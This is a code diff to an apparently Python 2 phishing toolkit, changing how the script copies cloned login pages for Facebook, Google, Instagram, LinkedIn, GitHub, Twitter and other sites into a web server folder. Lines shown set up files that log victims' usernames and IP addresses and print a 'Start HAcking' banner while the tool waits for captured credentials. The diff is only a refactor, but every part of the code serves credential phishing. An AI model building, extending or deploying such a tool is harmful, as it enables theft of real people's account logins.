@@ -7,6 +7,7 @@
 from time import sleep
 from sys import stdout, exit
 from os import system, path
+from distutils.dir_util import copy_tree
 import multiprocessing
 from urllib import urlopen
 from platform import system as systemos, architecture
@@ -72,43 +73,43 @@ def loadModule(module):
 def runPhishing(social, option2):
     system('sudo rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/iplog.txt')
     if option2 == '1' and social == 'Facebook':
-        system('cp WebPages/fb_standard/*.* Server/www/')
+        copy_tree("WebPages/fb_standard/", "Server/www/")
     if option2 == '2' and social == 'Facebook':
-        system('cp WebPages/fb_advanced_poll/*.* Server/www/')  
+        copy_tree("WebPages/fb_advanced_poll/", "Server/www/")  
     if option2 == '3' and social == 'Facebook':
-        system('cp WebPages/mobile_fb/*.* Server/www/')   
+        copy_tree("WebPages/mobile_fb/", "Server/www/")   
     if option2 == '4' and social == 'Facebook':
-        system('cp WebPages/fb_security_fake/*.* Server/www/')  
+        copy_tree("WebPages/fb_security_fake/", "Server/www/")  
     if option2 == '5' and social == 'Facebook':
-        system('cp WebPages/fb_messenger/*.* Server/www/')         
+        copy_tree("WebPages/fb_messenger/", "Server/www/")         
     elif option2 == '1' and social == 'Google':
-        system('cp WebPages/google_standard/*.* Server/www/')
+        copy_tree("WebPages/google_standard/", "Server/www/")
     elif option2 == '2' and social == 'Google':
-        system('cp WebPages/google_advanced_poll/*.* Server/www/')
+        copy_tree("WebPages/google_advanced_poll/", "Server/www/")
     elif option2 == '3' and social == 'Google':
-        system('cp WebPages/google_advanced_web/*.* Server/www/')   
+        copy_tree("WebPages/google_advanced_web/", "Server/www/")   
     elif social == 'LinkedIn':
-        system('cp WebPages/linkedin/*.* Server/www/')
+        copy_tree("WebPages/linkedin/", "Server/www/")
     elif social == 'GitHub':
-        system('cp WebPages/GitHub/*.* Server/www/')
+        copy_tree("WebPages/GitHub/", "Server/www/")
     elif social == 'StackOverflow':
-        system('cp WebPages/stackoverflow/*.* Server/www/')
+        copy_tree("WebPages/stackoverflow/", "Server/www/")
     elif social == 'WordPress':
-        system('cp WebPages/wordpress/*.* Server/www/')
+        copy_tree("WebPages/wordpress/", "Server/www/")
     elif social == 'Twitter':
-        system('cp WebPages/twitter/*.* Server/www/')
+        copy_tree("WebPages/twitter/", "Server/www/")
     elif social == 'Snapchat':
-        system('cp WebPages/Snapchat_web/*.* Server/www/')
+        copy_tree("WebPages/Snapchat_web/", "Server/www/")
     elif social == 'Yahoo':
-        system('cp WebPages/yahoo_web/*.* Server/www/')
+        copy_tree("WebPages/yahoo_web/", "Server/www/")
     elif social == 'Twitch':
-        system('cp WebPages/twitch/*.* Server/www/')
+        copy_tree("WebPages/twitch/", "Server/www/")
     elif social == 'Live':
-        system('cp WebPages/live_web/*.* Server/www/')
+        copy_tree("WebPages/live_web/", "Server/www/")	
     elif option2 == '1' and social == 'Instagram':
-        system('cp WebPages/Instagram_web/*.* Server/www/')    
+        copy_tree("WebPages/Instagram_web/", "Server/www/")    
     elif option2 == '2' and social == 'Instagram':
-        system('cp WebPages/Instagram_autoliker/*.* Server/www/')
+        copy_tree("WebPages/Instagram_autoliker/", "Server/www/")
         
 def waitCreds():
     print " {0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, END) 
@@ -227,7 +228,7 @@ def runPEnv():
     elif option == '12':
         loadModule('Live')
         option2 = ''
-        runPhishing('Live', option2)    
+        runPhishing('Live', option2)	
     else:
         exit(0)
 
